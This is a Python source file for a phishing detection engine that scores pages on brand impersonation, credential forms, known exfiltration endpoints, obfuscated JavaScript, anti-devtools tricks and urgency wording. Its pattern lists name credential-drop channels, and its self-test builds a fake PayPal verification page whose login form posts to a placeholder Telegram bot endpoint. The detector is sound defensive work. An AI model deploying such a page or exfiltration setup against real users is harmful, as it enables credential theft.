"""
Stage 5.6: Phishing Detection Engine
Advanced behavioral and structural phishing analyzer. Correlates indicators across:
  - Deceptive brand targeting and lookalike credentials
  - Credential harvesting forms and known exfiltration endpoints (Discord webhooks,
    Telegram bots, Formspree, generic form handlers)
  - Phishing kit obfuscation (eval/unescape, packed JavaScript, right-click/F12 blocks)
  - Social engineering urgency lures ("account suspended", "verify within 24h")
  - High-risk infrastructure combinations (tunnels/free hosts + login forms + new domains)
"""
import re
from urllib.parse import urlparse

# Phishing exfiltration endpoints commonly embedded in phishing kits
EXFILTRATION_PATTERNS = [
    (re.compile(r"https?://(?:api\.)?telegram\.org/bot[^/]+/sendMessage", re.IGNORECASE), "Telegram Bot API exfiltration"),
    (re.compile(r"https?://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/", re.IGNORECASE), "Discord webhook exfiltration"),
    (re.compile(r"https?://(?:formspree\.io|formsubmit\.co|submit-form\.com|getform\.io)/", re.IGNORECASE), "Third-party form drop service"),
    (re.compile(r"https?://api\.emailjs\.com/", re.IGNORECASE), "EmailJS credential drop"),
    (re.compile(r"https?://api\.web3forms\.com/", re.IGNORECASE), "Web3Forms credential drop"),
]

# Obfuscated JavaScript signatures used in phishing kits to hide credential stealing code
OBFUSCATION_SIGNATURES = [
    (re.compile(r"eval\s*\(\s*(?:unescape|decodeURI|decodeURIComponent|atob)\s*\(", re.IGNORECASE), "eval(unescape/atob) payload decoding"),
    (re.compile(r"document\.write\s*\(\s*(?:unescape|atob)\s*\(", re.IGNORECASE), "document.write(unescape) DOM injection"),
    (re.compile(r"eval\s*\(\s*function\s*\(\s*p\s*,\s*a\s*,\s*c\s*,\s*k\s*,\s*e\s*,\s*[dr]\s*\)", re.IGNORECASE), "Dean Edwards JS Packer obfuscation"),
    (re.compile(r"String\.fromCharCode\s*\(\s*(?:\d+\s*,\s*){6,}", re.IGNORECASE), "Long String.fromCharCode character sequence"),
    (re.compile(r"\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){8,}", re.IGNORECASE), "Long hex-encoded byte stream"),
]

# Anti-analysis code frequently found in phishing kits
ANTI_ANALYSIS_PATTERNS = [
    (re.compile(r"addEventListener\s*\(\s*['\"]contextmenu['\"]\s*,\s*(?:function|e\s*=>)\s*\{?\s*(?:e\.preventDefault|return false)", re.IGNORECASE), "Disables right-click context menu"),
    (re.compile(r"keyCode\s*===?\s*123|key\s*===?\s*['\"]F12['\"]", re.IGNORECASE), "Blocks F12 developer tools access"),
    (re.compile(r"keydown.*?ctrlKey.*?shiftKey.*?[IJCijc]", re.IGNORECASE), "Blocks DevTools shortcut (Ctrl+Shift+I/J/C)"),
]

# Social engineering lures
URGENCY_LURES = [
    re.compile(r"\baccount\s+suspended\b", re.IGNORECASE),
    re.compile(r"\bverify\s+your\s+identity\b", re.IGNORECASE),
    re.compile(r"\baction\s+required\s+within\b", re.IGNORECASE),
    re.compile(r"\bunauthorized\s+login\s+attempt\b", re.IGNORECASE),
    re.compile(r"\bsecurity\s+alert\b", re.IGNORECASE),
    re.compile(r"\bconfirm\s+your\s+seed\s+phrase\b", re.IGNORECASE),
    re.compile(r"\benter\s+your\s+(?:pin|passcode|secret\s+key)\b", re.IGNORECASE),
    re.compile(r"\byour\s+package\s+is\s+on\s+hold\b", re.IGNORECASE),
    re.compile(r"\bbilling\s+failure\b", re.IGNORECASE),
    re.compile(r"\bimmediate\s+verification\b", re.IGNORECASE),
]

POPULAR_BRANDS = {
    "google": ["google", "gmail", "youtube", "google drive"],
    "microsoft": ["microsoft", "office365", "onedrive", "outlook", "azure", "windows"],
    "apple": ["apple", "icloud", "apple id", "app store"],
    "amazon": ["amazon", "prime video", "aws"],
    "paypal": ["paypal"],
    "netflix": ["netflix"],
    "facebook": ["facebook", "meta", "messenger"],
    "instagram": ["instagram"],
    "whatsapp": ["whatsapp"],
    "twitter": ["twitter", "x.com"],
    "linkedin": ["linkedin"],
    "binance": ["binance"],
    "coinbase": ["coinbase"],
    "metamask": ["metamask"],
    "chase": ["chase", "jpmorgan"],
    "wellsfargo": ["wells fargo"],
    "bankofamerica": ["bank of america", "bofa"],
    "dhl": ["dhl", "dhl express"],
    "fedex": ["fedex"],
    "usps": ["usps", "postal service"],
}


def analyze_phishing(
    parsed_url: dict,
    content_result: dict = None,
    whois_result: dict = None,
    heuristics_result: dict = None,
    html_body: str = "",
    extra_js: str = "",
) -> dict:
    """
    Performs specialized multi-vector phishing detection.

    Returns:
        is_phishing: bool
        phishing_score: int (0-100)
        confidence: "Critical", "High", "Medium", "Low", "None"
        targeted_brand: str or None
        phishing_kit_detected: bool
        indicators: list[dict]
        exfiltration_endpoints: list[str]
        flags: list[str]
    """
    flags = []
    indicators = []
    score = 0
    exfiltration_targets = []
    kit_detected = False

    hostname = (parsed_url.get("hostname") or "").lower()
    full_url = (parsed_url.get("original_url") or "").lower()
    registered_domain = (parsed_url.get("registered_domain") or "").lower()
    subdomain = (parsed_url.get("subdomain") or "").lower()
    domain_label = (parsed_url.get("domain") or "").lower()

    # 1. Target brand detection in URL subdomains / paths
    targeted_brand = None
    for brand, aliases in POPULAR_BRANDS.items():
        if brand in registered_domain:
            continue  # Legit brand domain
        for alias in aliases:
            if alias in subdomain or (f"/{alias}" in full_url):
                targeted_brand = brand
                flags.append(f"Deceptive URL structure: subdomains/path contain '{alias}', imitating '{brand}'")
                indicators.append({
                    "category": "Brand Impersonation",
                    "detail": f"Subdomain/path contains '{alias}' but apex domain is '{registered_domain}'",
                    "severity": "High",
                })
                score += 35
                break
        if targeted_brand:
            break

    # 2. Inspect HTML & JS content
    combined_text = (html_body or "") + " " + (extra_js or "")
    if content_result and isinstance(content_result, dict):
        title = content_result.get("title", "")
        if title:
            combined_text += f" {title}"

    if combined_text:
        # Check brand name in page title/content
        if not targeted_brand:
            for brand, aliases in POPULAR_BRANDS.items():
                if brand in registered_domain:
                    continue
                for alias in aliases:
                    if re.search(rf"\b{re.escape(alias)}\b", combined_text, re.IGNORECASE):
                        targeted_brand = brand
                        flags.append(f"Content mentions '{alias}' but site is hosted under '{registered_domain}'")
                        indicators.append({
                            "category": "Brand Impersonation",
                            "detail": f"Content claims to be '{alias}' without domain ownership",
                            "severity": "High",
                        })
                        score += 30
                        break
                if targeted_brand:
                    break

        # Check for credential harvesting forms
        has_password = bool(re.search(r"<input\b[^>]*\btype\s*=\s*[\"']?password", combined_text, re.IGNORECASE))
        if has_password:
            indicators.append({
                "category": "Credential Harvesting",
                "detail": "HTML contains a password input field",
                "severity": "Medium",
            })
            score += 25

        # Check form actions for external or webhook exfiltration
        form_actions = []
        if content_result and content_result.get("form_actions"):
            form_actions.extend(content_result["form_actions"])
        for m in re.finditer(r"\baction\s*=\s*[\"']?([^\"'\s>]*)", combined_text, re.IGNORECASE):
            action_val = m.group(1)
            if action_val and not action_val.startswith(("#", "javascript:")):
                form_actions.append(action_val)

        for action in form_actions:
            # Check exfiltration patterns
            for pattern, pattern_name in EXFILTRATION_PATTERNS:
                if pattern.search(action):
                    kit_detected = True
                    exfiltration_targets.append(action)
                    flags.append(f"Malicious exfiltration detected: form submits to {pattern_name} ({action[:60]}...)")
                    indicators.append({
                        "category": "Data Exfiltration",
                        "detail": f"Form sends submitted credentials to {pattern_name}",
                        "severity": "Critical",
                    })
                    score += 45

        # Check JavaScript Obfuscation signatures
        for pattern, sig_name in OBFUSCATION_SIGNATURES:
            if pattern.search(combined_text):
                kit_detected = True
                flags.append(f"Phishing kit obfuscation detected: {sig_name}")
                indicators.append({
                    "category": "Evasion / Obfuscation",
                    "detail": sig_name,
                    "severity": "High",
                })
                score += 30

        # Check Anti-Analysis tricks
        for pattern, trick_name in ANTI_ANALYSIS_PATTERNS:
            if pattern.search(combined_text):
                flags.append(f"Anti-analysis mechanism detected: {trick_name}")
                indicators.append({
                    "category": "Anti-Analysis",
                    "detail": trick_name,
                    "severity": "Medium",
                })
                score += 15

        # Check Urgency Lures
        matched_lures = []
        for lure_pattern in URGENCY_LURES:
            m = lure_pattern.search(combined_text)
            if m:
                matched_lures.append(m.group(0))
        if matched_lures:
            flags.append(f"Social engineering urgency lures detected: {', '.join(matched_lures[:3])}")
            indicators.append({
                "category": "Social Engineering",
                "detail": f"Uses urgent deceptive language: {', '.join(matched_lures[:3])}",
                "severity": "Medium",
            })
            score += 20

    # 3. Infrastructure correlation
    age_days = whois_result.get("age_days") if whois_result else None
    if age_days is not None and age_days < 30 and (targeted_brand or score >= 25):
        flags.append(f"High-risk correlation: brand targeting on freshly registered domain ({age_days} days old)")
        indicators.append({
            "category": "Infrastructure",
            "detail": f"Brand-new domain ({age_days} days) hosting targeted content",
            "severity": "High",
        })
        score += 30

    # Determine confidence and verdict
    final_score = min(score, 100)
    if final_score >= 70 or kit_detected or (targeted_brand and final_score >= 50):
        confidence = "High"
        is_phishing = True
    elif final_score >= 40:
        confidence = "Medium"
        is_phishing = True
    elif final_score >= 20:
        confidence = "Low"
        is_phishing = False
    else:
        confidence = "None"
        is_phishing = False

    return {
        "is_phishing": is_phishing,
        "phishing_score": final_score,
        "confidence": confidence,
        "targeted_brand": targeted_brand,
        "phishing_kit_detected": kit_detected,
        "indicators": indicators,
        "exfiltration_endpoints": exfiltration_targets,
        "flags": flags,
    }


if __name__ == "__main__":
    import json
    import sys
    from url_parser import parse_url

    test_url = sys.argv[1] if len(sys.argv) > 1 else "http://login.paypal.com.verify-account.xyz/index.php"
    test_html = """
    <html><head><title>PayPal - Account Verification</title></head>
    <body>
      <h2>Account Suspended</h2>
      <p>Verify your identity within 24 hours.</p>
      <form action="https://api.telegram.org/bot12345:token/sendMessage" method="POST">
        <input type="text" name="email">
        <input type="password" name="password">
        <button type="submit">Verify</button>
      </form>
    </body></html>
    """
    parsed = parse_url(test_url)
    print(json.dumps(analyze_phishing(parsed, html_body=test_html), indent=2))

